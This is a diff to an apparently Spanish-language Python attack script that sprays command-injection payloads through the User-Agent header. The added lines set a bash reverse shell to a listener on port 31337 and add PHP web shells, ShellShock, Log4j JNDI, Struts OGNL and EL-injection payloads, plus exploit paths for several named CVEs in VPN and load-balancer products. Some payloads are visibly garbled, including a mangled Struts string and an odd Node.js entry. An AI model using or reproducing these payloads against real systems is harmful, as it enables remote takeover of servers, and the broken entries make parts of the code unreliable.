@@ -49,10 +49,17 @@ def main():
     url = rhost
 
     # Payload inyectado en el User-Agent
-    cmd = f"bash -i >& /dev/tcp/{lhost}/your_port 0>&1"  # Replace with your actual command
+    cmd = f"bash -i >& /dev/tcp/{lhost}/31337 0>&1"  # Replace with your actual command
 
     payloads = {
-        'PHP': f"<?php system($_GET['cmd']); ?>",
+        'PHP system': f"<?php system($_GET['cmd']); ?>",
+		'PHP exec':f"<?php exec($_GET['cmd']); ?>",
+		'PHP shell_exec':f"<?php shell_exec($_GET['cmd']); ?>",
+		'PHP passtrhu':f"<?php passthru($_GET['cmd']); ?>",
+		'PHP eval':f"<?php eval($_GET['cmd']); ?>",
+		'PHP assert':f"<?php assert($_GET['cmd']); ?>",
+		'Java':"${T(java.lang.Runtime).getRuntime().exec('{cmd}')}".replace('{cmd}',cmd),
+        'ShellShock':"() { :;}; /bin/bash -i >& /dev/tcp/127.0.0.1/31337 0>&1'",
         'Python': f"import os; os.system(os.getenv('cmd'))",
         'Node.js': f"require('child_process').exec(require('url').parse(require('http').createServer(function (req, res) {{ res.writeHead(200, {{ 'Content-Type': 'text/plain' }}); res.end('Hello World'); }}).listen(3000).on('listening', function () {{ console.log('Server running at http://127.0.0.1:3000/'); }}).on('request', function (req, res) {{ require('querystring').parse(require('url').parse(req.url).query).cmd }}).cmd));",
         'Ruby': f"`ENV['cmd']`",
@@ -91,7 +98,21 @@ def main():
         'Scheme': f"(system (getenv \"cmd\"))",
         'Smalltalk': f"OSProcess command: (System getEnv: 'cmd')",
         'COBOL': f"call 'system' using by value address of cmd",
-        'Tcl': f"exec $env(cmd)"
+        'Struts2_RCE1': "%{{(#_='multipart/form-data').(#[email protected]('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#out.print('{}'),#out.flush(),#out.close())}}".format(cmd),
+        'Tcl': f"exec $env(cmd)",
+        'JSF_ELInjection': "#{request.setAttribute('exec', T(java.lang.Runtime).getRuntime().exec('{cmd}'))}".replace('{cmd}',cmd),
+        'JSP_ELInjection': "${{new java.lang.ProcessBuilder('{cmd}'.split(' ')).start()}}".replace('{cmd}',cmd),
+        'Log4j_JNDI': "${{jndi:ldap://{}/malware}}".format(lhost),
+        'GroovyScriptEngine': "${{groovy.util.Eval.me('{cmd}')}}".replace('{cmd}',cmd),
+        'Scripting_Language_Perl': f"perl -e 'exec \"{cmd}\"'",
+        'Scripting_Language_Python': f"python -c 'import os; os.system(\"{cmd}\")'",
+        'Scripting_Language_Ruby': f"ruby -e 'exec \"{cmd}\"'",
+        'CVE-2019-19781': f"/vpn/../vpns/portal/scripts/newbm.pl",
+        'CVE-2020-5902': f"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
+        'CVE-2020-3452': f"/+CSCOT+/translation-table",
+        'CVE-2018-13382': f"/vpn/../dana-na/../dana/html5acc/guacamole/scripts/sessionLogout",
+        'CVE-2017-5638': "${{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}}".replace('{cmd}',cmd),
+        'CVE-2021-22986': f"/mgmt/tm/util/{cmd}"
     }
 
     # Formatear cada payload con el comando
